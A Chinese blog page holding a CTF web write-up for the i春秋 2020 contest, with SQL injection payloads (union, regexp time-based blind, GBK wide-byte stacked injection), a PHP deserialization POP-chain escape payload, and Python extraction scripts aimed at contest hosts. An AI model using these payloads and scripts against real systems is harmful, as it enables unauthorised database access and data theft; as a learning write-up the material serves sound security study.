@@ -1,0 +1,1424 @@
+
+	<!DOCTYPE html>
+	<html class="scrollbar">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      i春秋2020新春战“疫”网络安全公益赛 web Writeup | 似雍&amp;&amp;非庸
+    
+  </title>
+  <meta name="author" content="Alex">
+  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="description" content="个人博客" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+    <!-- jquery -->
+	<script src="/js/jquery-2.1.1.min.js"></script>
+
+  <!-- leancloud -->
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script src="/js/leancloud.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="transition">
+					<div class="three-bounce1"></div>
+					<div class="three-bounce2"></div>
+					<div class="three-bounce3"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground" data-img-mode="random" data-normal-src="https://source.unsplash.com/collection/954550/1920x1080" data-random-max="110" data-random-src="/images/post-cover/">
+	<div class="mask">
+		<div class="h-header">
+			<div id="logo-S">
+				
+					<a href="/">
+						<img src="/img/logo.png" alt="Logo">
+					</a>
+				
+			</div>
+			<!-- Navigation in header(id="navigation-S") -->
+			<div id="navigation-S">
+				<ul>
+					
+						<li class="menu-home">
+							<a href="/" class="menu-item-home">主页</a>
+						</li>
+					
+						<li class="menu-archive">
+							<a href="/archives" class="menu-item-archive">归档</a>
+						</li>
+					
+						<li class="menu-categories">
+							<a href="/categories" class="menu-item-categories">分类</a>
+						</li>
+					
+						<li class="menu-tags">
+							<a href="/tags" class="menu-item-tags">标签</a>
+						</li>
+					
+						<li class="menu-about">
+							<a href="/about" class="menu-item-about">关于</a>
+						</li>
+					
+						<li class="menu-gallery">
+							<a href="/gallery" class="menu-item-gallery">相册</a>
+						</li>
+					
+
+					
+						<li class="menu-search">
+							<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+						</li>
+					
+				</ul>			
+			</div>				
+		</div>
+
+		<div class="h-body">	
+			<!-- motto -->
+			
+				<div id="page-motto">
+					<p class="motto">
+						
+					</p>
+				</div>
+			
+
+			<div id="navigation-H">
+				<!-- Page title -->
+				<p>
+					
+						当前文章&nbsp;:&nbsp;《i春秋2020新春战“疫”网络安全公益赛 web Writeup》
+					
+				</p>
+				<!-- Progress bar -->
+				<div id="progress-bar"></div>
+
+				<!-- Progress percent -->
+				<div id="progress-percentage">
+					<h1>0.0%</h1>
+				</div>
+			</div>
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<ul>
+				<li>
+					<a><i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>切换背景</a>
+				</li>
+				<li>
+					<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down"></i>继续阅读</a>
+				</li>
+				<li>
+					<a href="https://github.com/Sariay/hexo-theme-Annie" target="_blank"><i class="fa fa-download"></i>克隆主题</a>
+				</li>
+			</ul>
+		</div>
+		
+		<!-- This is only a demo, please go to "https://time.is" to set your city time! -->
+<style type="text/css">
+	.header-date {
+		position: absolute;
+		left: 40px;
+		bottom: 30px;
+		writing-mode: tb-rl;
+		font-size: 36px;
+	}	
+	.header-date a {
+		border-bottom: none;
+	}
+	@media only screen and (max-width: 768 ) {
+		.header-date {
+			position: absolute;
+			left: 40px;
+			bottom: 30px;
+			writing-mode: tb-rl;
+			font-size: 20px;
+		}			
+	}
+</style>
+<div class="header-date">
+	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow" ></a>
+	<span id="Beijing_z43d"></span>
+</div>
+<script src="//widget.time.is/zh.js"></script>
+<script>
+	time_is_widget.init({
+		Beijing_z43d:{
+			template:"DATE", 
+			date_format:"year年 monthname dnum日"
+		}
+	});
+</script>
+</header>
+
+<!-- Navigation in div(id="navigation-H") -->
+<a class="nav-trigger">
+	<span></span>
+</a>
+
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<h3>Navigation</h3>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	<div class="nav-body">
+		<ul>
+			
+				<li class="menu-home">
+					<a href="/" class="menu-item-home">主页</a>
+				</li>
+			
+				<li class="menu-archive">
+					<a href="/archives" class="menu-item-archive">归档</a>
+				</li>
+			
+				<li class="menu-categories">
+					<a href="/categories" class="menu-item-categories">分类</a>
+				</li>
+			
+				<li class="menu-tags">
+					<a href="/tags" class="menu-item-tags">标签</a>
+				</li>
+			
+				<li class="menu-about">
+					<a href="/about" class="menu-item-about">关于</a>
+				</li>
+			
+				<li class="menu-gallery">
+					<a href="/gallery" class="menu-item-gallery">相册</a>
+				</li>
+			
+
+			
+				<li class="menu-search">
+					<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+				</li>
+			
+		</ul>
+	</div>
+
+	<div class="nav-footer">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+</nav>
+
+		
+		<!--main-->
+		<main>
+			<div class="layout-post">
+	
+	
+	<div class="article-title">
+		
+	<a href="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/" itemprop="url">
+		i春秋2020新春战“疫”网络安全公益赛 web Writeup
+	</a>
+
+	</div>
+
+	<div class="article-meta">
+		<span>
+			
+	发布于
+	<a href="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/" itemprop="url">
+		<time datetime="2020-02-24T03:25:35.000Z" itemprop="datePublished">
+	  		2020-02-24
+	  </time>
+	</a> 
+
+	/
+	更新于
+	<a href="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/" itemprop="url">
+		<time datetime="2020-02-24T03:25:35.000Z" itemprop="dateUpdated">
+	  		2020-02-28
+	  </time>
+	</a> 	
+
+		</span>
+		/
+		<span>
+			<i class="fa fa-tags"></i>
+			
+	
+		<a href="/tags/writeup/" class=" ">
+			writeup
+		</a>
+	
+		
+		</span>
+		/
+		
+
+    <span class="leancloud_visitors" id="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/_visitors" data-url="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/" data-title="i春秋2020新春战“疫”网络安全公益赛 web Writeup">
+        热度
+        <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
+    </span>
+    
+    /
+
+
+
+    <span class="leancloud_likes" id="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/_likes" data-url="/2020/02/24/i春秋2020新春战“疫”网络安全公益赛-web-Writeup/" data-title="i春秋2020新春战“疫”网络安全公益赛 web Writeup" rel="unlike">
+        喜欢
+        <i class="fa fa-heart"></i>
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+
+	</div>
+
+	<div class="article-content" id="article-content">
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛题目质量挺好的，除啦环境可能有时候有点问题。（就让我遇到了。心态炸了一天。。。）其他都挺好的。</p>
+<h2 id="DAY1"><a href="#DAY1" class="headerlink" title="DAY1"></a>DAY1</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p><strong>知识点：sql注入的联合注入或盲注</strong><br>存在注册和登陆功能，首先进行注册后登陆进系统，发现有一个模块是管理员才能使用的功能，所以我们就需要登陆管理账号，在登陆后的系统里，没有发现存在漏洞，所以来测试登陆框，万能账号：<code>admin&#39; or 1#</code>成功登录。<br>使用管理员的特有功能，进行搜索，测试发现存在注入。<br>直接使用联合注入：</p>
+<pre class="line-numbers language-html"><code class="language-html">注库：
+1' union select 1,(select database()),3,4,5#
+注表：
+1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5#
+注列：
+1' union select 1,(Select group_concat(column_name) from information_schema.columns where table_name='flag'),3,4,5#
+获得flag
+1' union select 1,(select flaaag from flag),3,4,5#
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>盲注也可以，这里可以用联合注入，就不要用盲注了。</p>
+<h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p><strong>知识点：文件上传</strong><br>这个就不说了，直接上传马，在根目录有个flag和readflag，执行/readflag即可。</p>
+<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p><strong>知识点：反序列化pop链构造</strong><br>出题人出题笔记：<a href="http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%25e6%2598%25a5%25e7%25a7%258b%25e5%2585%25ac%25e7%259b%258a%25e8%25b5%259b%25e5%2587%25ba%25e9%25a2%2598%25e7%25ac%2594%25e8%25ae%25b0/" target="_blank" rel="noopener">20.2.21 | i春秋公益赛出题笔记</a><br>扫描目录存在<a href="http://www.zip。得到源码，开始审计，（入坑了。）" target="_blank" rel="noopener">www.zip。得到源码，开始审计，（入坑了。）</a><br>update.php</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+require_once('lib.php');
+echo '&lt;html>
+&lt;meta charset="utf-8">
+&lt;title>update&lt;/title>
+&lt;h2>这是一个未完成的页面，上线时建议删除本页面&lt;/h2>
+&lt;/html>';
+if ($_SESSION['login']!=1){
+    echo "你还没有登陆呢！";
+}
+$users=new User();
+$users->update();
+if($_SESSION['login']===1){
+    require_once("flag.php");
+    echo $flag;
+}
+
+?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>没仔细看，<code>你还没有登陆呢！</code>这句话是<strong>echo</strong>的不是die。。。 我看错了。所以一直看不出来有啥洞，甚至一直认为是弱口令呢。真sb。下次认真看，一句句看。真<em>**</em><br>看清之后，思路就清晰多了，只要登陆上就直接给flag。所以要构造pop链，来执行sql语句，最后登陆上，得到flag。<br>这里需要看看：<br>lib.php了：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+error_reporting(0);
+session_start();
+function safe($parm){
+    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
+    return str_replace($array,'hacker',$parm);
+}
+class User
+{
+    public $id;
+    public $age=null;
+    public $nickname=null;
+    public function login() {
+        if(isset($_POST['username'])&amp;&amp;isset($_POST['password'])){
+        $mysqli=new dbCtrl();
+        $this->id=$mysqli->login('select id,password from user where username=?');
+        if($this->id){
+        $_SESSION['id']=$this->id;  
+        $_SESSION['login']=1;
+        echo "你的ID是".$_SESSION['id'];
+        echo "你好！".$_SESSION['token'];
+        echo "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'./update.php'</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>";
+        return $this->id;
+        }
+    }
+}
+    public function update(){
+        $Info=unserialize($this->getNewinfo());
+        $age=$Info->age;
+        $nickname=$Info->nickname;
+        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
+        //这个功能还没有写完 先占坑
+    }
+    public function getNewInfo(){
+        $age=$_POST['age'];
+        $nickname=$_POST['nickname'];
+        return safe(serialize(new Info($age,$nickname)));
+    }
+    public function __destruct(){
+        return file_get_contents($this->nickname);//危
+    }
+    public function __toString()
+    {
+        $this->nickname->update($this->age);
+        return "0-0";
+    }
+}
+class Info{
+    public $age;
+    public $nickname;
+    public $CtrlCase;
+    public function __construct($age,$nickname){
+        $this->age=$age;
+        $this->nickname=$nickname;
+    }   
+    public function __call($name,$argument){
+        echo $this->CtrlCase->login($argument[0]);
+    }
+}
+Class UpdateHelper{
+    public $id;
+    public $newinfo;
+    public $sql;
+    public function __construct($newInfo,$sql){
+        $newInfo=unserialize($newInfo);
+        $upDate=new dbCtrl();
+    }
+    public function __destruct()
+    {
+        echo $this->sql;
+    }
+}
+class dbCtrl
+{
+    public $hostname="127.0.0.1";
+    public $dbuser="noob123";
+    public $dbpass="noob123";
+    public $database="noob123";
+    public $name;
+    public $password;
+    public $mysqli;
+    public $token;
+    public function __construct()
+    {
+        $this->name=$_POST['username'];
+        $this->password=$_POST['password'];
+        $this->token=$_SESSION['token'];
+    }
+    public function login($sql)
+    {
+        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
+        if ($this->mysqli->connect_error) {
+            die("连接失败，错误:" . $this->mysqli->connect_error);
+        }
+        $result=$this->mysqli->prepare($sql);
+        $result->bind_param('s', $this->name);
+        $result->execute();
+        $result->bind_result($idResult, $passwordResult);
+        $result->fetch();
+        $result->close();
+        if ($this->token=='admin') {
+            return $idResult;
+        }
+        if (!$idResult) {
+            echo('用户不存在!');
+            return false;
+        }
+        if (md5($this->password)!==$passwordResult) {
+            echo('密码错误！');
+            return false;
+        }
+        $_SESSION['token']=$this->name;
+        return $idResult;
+    }
+    public function update($sql)
+    {
+        //还没来得及写
+    }
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>追踪调用的update方法：</p>
+<pre class="line-numbers language-html"><code class="language-html">public function update(){
+    $Info=unserialize($this->getNewinfo());
+    $age=$Info->age;
+    $nickname=$Info->nickname;
+    $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
+    //这个功能还没有写完 先占坑
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>update方法里，使用unserialize来处理getNewinfo方法返回值。<br>再看getNewinfo方法：</p>
+<pre class="line-numbers language-html"><code class="language-html">public function getNewInfo(){
+    $age=$_POST['age'];
+    $nickname=$_POST['nickname'];
+    return safe(serialize(new Info($age,$nickname)));
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>把获取的参数，生成一个Info类的对象，然后进行序列化，然后再使用safe函数进行安全处理。<br>这里我们要警觉。在数据已经序列化完成的情况下使用过滤函数改变了序列化字符的长度，导致可以逃逸字符出来，然后注入对象。</p>
+<pre class="line-numbers language-html"><code class="language-html">function safe($parm){
+    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
+    return str_replace($array,'hacker',$parm);
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>再看Info类，这个类没什么好说的。</p>
+<pre class="line-numbers language-html"><code class="language-html">__call() 在一个对象的上下文中，如果调用的方法不能访问，它将被触发
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这里并不会触发。没有什么可利用的。<br>再回到update方法。然后对反序列化的数据对age和nickname进行赋值。然后生成UpdateHelper对象。把<code>$_SESSION[&#39;id&#39;]</code><br>和反序列化的<code>$Info</code>对象和update的sql传入UpdateHelper类的构造函数。<br>UpdateHelper构造函数中，把反序列化的<code>$Info</code>对象进行反序列化处理。生成dbCtrl对象。后开始UpdateHelper对象的执行析构函数。然后执行user类的析构函数。<br>正常的顺序是这样的。<br>构造pop链：<br>但是我们发现UpdateHelper对象的执行析构函数的时候，我们可以把$this-&gt;sql=new User()，那么就会调用User的tostring函数。<br>我们再把$this-&gt;nickname=new info();那么就会调用Info的call函数.<br>我们再$this-&gt;CtrlCase=new dbCtrl();那么就会调用dbCtrl的login函数<br>而该函数可以执行任意的sql语句，并且会把值return出来。<br>所以构造poc：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+error_reporting(0);
+class dbCtrl
+{
+    public $hostname="127.0.0.1";
+    public $dbuser="root";
+    public $dbpass="root";
+    public $database="test";
+    public $name='admin';
+    public $password;
+    public $mysqli;
+    public $token='admin';
+}
+class Info{
+    public $age;
+    public $nickname;
+    public $CtrlCase;
+    public function __construct()
+    {
+    $this->CtrlCase=new dbCtrl();
+    }
+}
+class User
+{
+    public $id;
+    public $age='select password,id from user where username=?';
+    public $nickname;
+    public function __construct()
+    {
+        $this->nickname=new info();
+    }
+
+}
+Class UpdateHelper{
+    public $id;
+    public $newinfo;
+    public $sql;
+    public function __construct()
+    {
+        $this->sql=new user();
+    }
+}
+
+echo serialize(new UpdateHelper());
+//O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>由于我们是逃逸出来的，所以我们必须得让程序能够成功的序列化。<br>我们来生成一个正常的info对象：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+class Info{
+    public $age='1';
+    public $nickname='alex';
+    public $CtrlCase;
+}
+echo serialize(new info());
+//O:4:"Info":3:{s:3:"age";s:1:"1";s:8:"nickname";s:4:"alex";s:8:"CtrlCase";N;}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在这个反序列化字符串中，我们能够控制的属性是age和nickname；由于反序列化的字符中有三个属性。为了保持一致，所以我们要在payload前加上<code>&quot;;s:8:&quot;CtrlCase&quot;;</code>在后面加上<code>}</code>来闭合这个反序列化字符串。让它把后面的字符忽略。<br>得到payload：</p>
+<pre class="line-numbers language-html"><code class="language-html">";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>我们构造的payload的长度为443。所以我们需要在nickname中插入足量的黑名单字符，把payload挤进去。一个<code>*</code>号替换成<code>hacker</code>,可以挤出五个字符。<code>union</code>字符串可以挤出一个字符。所以我们要用88个<code>*</code>号和3个<code>union</code>。来进行字符逃逸。<br>所以构造payload:<br>在update.php里post提交。</p>
+<pre class="line-numbers language-html"><code class="language-html">age=1&amp;nickname=****************************************************************************************unionunionunion";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><strong>知识点：sql注入之regexp时间盲注</strong><br>通过fuzz过滤了：<code>select</code>,<code>union</code>,<code>%</code>,<code>*</code>,<code>&lt;</code>,<code>&gt;</code>,<code>between</code>,<code>into</code>,<code>insert</code>,<code>update</code>,<code>=</code>,<code>&#39;</code>,<code>like</code>等。<br>直接给了sql语句：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+    # flag在fl4g里
+    include 'waf.php';
+    header("Content-type: text/html; charset=utf-8"); 
+    $db = new mysql();
+
+    $id = $_GET['id'];
+
+    if ($id) {
+        if(check_sql($id)){
+            exit();
+        } else {
+            $sql = "select * from flllllllag where id=$id";
+            $db->query($sql);
+        }
+    }
+    highlight_file(__FILE__);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个题由于没有过滤<code>；</code>号，当时一直以为是堆叠注入呢。。。但是没回显。没办法过<code>select</code>。<br>正确的思路应该是：跟这提示<code>flag在fl4g里</code>，意思实际是列名是<code>f14g</code>。<br>regexp可以代替等号来判断。<br>payload的形式：</p>
+<pre class="line-numbers language-html"><code class="language-html">if(length(database()) regexp 4,sleep(3),1)
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+flag=''
+for i in range(1,50):
+    a=0
+    for j in range(32, 128):
+        url = "http://3ef5bd5636424e94b9f31a782e59f13eab76c847431f4514.changame.ichunqiu.com/?id=if(ascii(substr(fl4g,"+str(i)+",1)) regexp " + str(j) + ",sleep(3),1)"
+        res = requests.get(url)
+        try:
+            result = requests.get(url, timeout=3)
+        except requests.exceptions.ReadTimeout:
+            flag+=chr(j)
+            print(flag)
+            break
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="DAY2"><a href="#DAY2" class="headerlink" title="DAY2"></a>DAY2</h2><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p><strong>知识点：sql注入bypass</strong><br>直接给出源码：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php 
+    function check($str)
+    {
+        if(preg_match('/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i',$str,$matches))
+        {
+            print_r($matches);
+            return 0;
+        }
+        else
+        {
+            return 1;
+        }
+    }
+    try
+    {
+        $db = new PDO('mysql:host=localhost;dbname=pdotest','root','******');
+    } 
+    catch(Exception $e)
+    {
+        echo $e->getMessage();
+    }
+    if(isset($_GET['id']))
+    {
+        $id = $_GET['id'];
+    }
+    else
+    {
+        $test = $db->query("select balabala from table1");
+        $res = $test->fetch(PDO::FETCH_ASSOC);
+        $id = $res['balabala'];
+    }
+    if(check($id))
+    {
+        $query = "select balabala from table1 where 1=?";
+        $db->query("set names gbk");
+        $row = $db->prepare($query);
+        $row->bindParam(1,$id);
+        $row->execute();
+    }
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>一看就是宽字节注入，发现没有回显，只能使用时间盲注，但是过滤了select和sleep等，但是没有过滤分号，又造成堆叠注入，<br>绕过方法：set+prepare+execute 来执行sql语句。把要执行的sql语句转化为十六进制或者concat+char拼接字符。<br>脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">#coding=utf-8
+import requests as rq
+import sys
+
+reload(sys)
+sys.setdefaultencoding("utf8")
+def encodepayload(exp):
+    payload = "0%df%27;set @s={sql};PREPARE a FROM @s;EXECUTE a;"
+    my_payload = payload.format(sql="0x"+exp.encode('hex'))
+    return my_payload
+
+url='http://c2822cb900324501ad46f15ee8627c2f96af6088ba91444b.changame.ichunqiu.com/?id='
+flag=""
+headers={
+    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'
+}
+
+for a in range(1,50):
+    for i in range(32,127):
+        # post= "select ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()), "+str(a)+", 1))="+str(i)+" and sleep(3)"
+        # post= "select ascii(mid((Select group_concat(column_name) from information_schema.columns where table_name='table1'), "+str(a)+", 1))="+str(i)+" and sleep(3)"#balabala,eihey,fllllll4g,bbb
+        post= "select ascii(mid((Select group_concat(fllllll4g) from table1), "+str(a)+", 1))="+str(i)+" and sleep(3)"#
+        print(post)
+        try:
+            res=rq.get(url+encodepayload(post),headers=headers,timeout =3)
+            if i == 126:
+                print(flag)
+                exit()
+        except Exception as e:
+            flag+=chr(i)
+            print(flag)
+            break
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p><strong>知识点：SQL注入中baypass表名和无列名注入</strong><br>这里先给出题人smile师傅的官方writeup:<br><a href="https://www.smi1e.top/%25e6%2596%25b0%25e6%2598%25a5%25e6%2588%2598%25e7%2596%25ab%25e5%2585%25ac%25e7%259b%258a%25e8%25b5%259b-ezsqli-%25e5%2587%25ba%25e9%25a2%2598%25e5%25b0%258f%25e8%25ae%25b0/" target="_blank" rel="noopener">新春战疫公益赛-ezsqli-出题小记</a><br>这个题过滤了常见的 or和常用的 <code>innodb_table_stats</code>  和 <code>innodb_index_stats</code>没办法用了，所以<br>我们需要找到新的方法来注表名。<br>库名很常规就可以注出来。<br>通过这篇<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a>我们知道绕过的方法有：</p>
+<pre class="line-numbers language-html"><code class="language-html">sys.schema_table_statistics_with_buffer
+sys.x$schema_table_statistics_with_buffer
+sys.x$schema_flattened_keys
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>然后就是无列名注数据了。因为过滤了in,所以join,using都不能用了，同时过滤了union和select同时使用。没办法用常用的无列名注入了。这里就用到了新的一种方法：<br><img src="https://s2.ax1x.com/2020/02/24/38Eh7R.png" alt="38Eh7R.png"><br>主要利用&lt;,=,&gt;来进行判断，进行注入。<br>这里由于知道比赛的flag是uuid形式的，没有大写的所以不用考虑大小写问题。但是我们不能为了做题而做题，那么区分大小写的方法有哪些呢：</p>
+<ol>
+<li><code>select (select 1,binary(&#39;a&#39;)=(select * from user limit 1)</code></li>
+<li><code>select (select 1,SELECT CONCAT(“A”, CAST(0 AS JSON))=(select * from user limit 1)</code></li>
+<li><code>select (select 1,0x41)=(select * from user limit 1)</code><br><img src="https://s2.ax1x.com/2020/02/24/38MGQ0.png" alt="38MGQ0.png"><br>这里面第一种方法不能用。第三种方法只能用于等号。所以最好用第二种。<br>之后就是写脚本了。</li>
+</ol>
